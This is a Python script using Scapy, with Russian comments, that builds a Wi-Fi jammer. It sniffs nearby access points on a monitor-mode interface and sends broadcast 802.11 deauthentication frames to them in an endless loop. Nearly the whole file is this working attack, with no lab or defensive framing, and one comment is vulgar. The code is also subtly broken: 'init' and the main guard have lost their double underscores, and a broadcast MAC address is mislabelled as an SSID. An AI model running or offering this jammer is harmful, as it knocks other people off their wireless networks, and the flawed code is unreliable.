from scapy.all import * #Импортируем Scapy
import threading
import sys
import os

dev="mon0" # Наша карточка, переведённая в режим монитора

class wifi_jam: # Для красоты создадим класс
    def init(self, iface):
        self.iface = iface

    ap_list = [] # Список (или массив) вафлей

    def get_ap_list(self, packet): # Функция для заполнения списка вафлей (ap_list)
        if packet not in self.ap_list:
            self.ap_list.append(packet)

    def sniff(self): # Вызывает функцию выше (обратите внимание на prn=self.get_ap_list). Мониторит все точки.
        while True:
            sniff(iface=self.iface, prn=self.get_ap_list, timeout=1)

    def jam_wifi(self): # Сам деавторизатор
        fake_client_ssid = "FF:FF:FF:FF:FF:FF" # Фейковый SSID клиента (чтобы не получать SSID всех клиентов)
        count = 4 # Количество посылаемых пакетов
        if self.ap_list: # Посылаем пакеты только если список не пустой
            addr2 = random.choice(self.ap_list).addr2 # Выбор рандомного клиента из списка
            packet = RadioTap()/Dot11(type=0, subtype=12, addr1=fake_client_ssid,
                                      addr2=addr2, addr3=addr2)/Dot11Deauth() # Строим пакет деавторизации
            sendp(packet, verbose=0, iface=self.iface, count=count) # Отправляем пакет деавторизации


def main():
    global dev
    if os.geteuid(): # Просто проверка, что скрипт запущен от рута. Вкратце - у рута EUID (и UID) - 0, у всех остальных - положительное число.
        print("This script must be run as root")
        sys.exit()

    wj = wifi_jam(dev) # Инициализируем класс. dev указан в init класса.

    get_ap_list = threading.Thread(target=wj.sniff) # Создаём отдельный поток для заполнения списка точек
    get_ap_list.start() # И запускаем

    while True:
        wj.jam_wifi() # Хуярим по точкам
# забыл уточнить, нужно сперва написать  "pip install scapy"

if name == "main":
    main()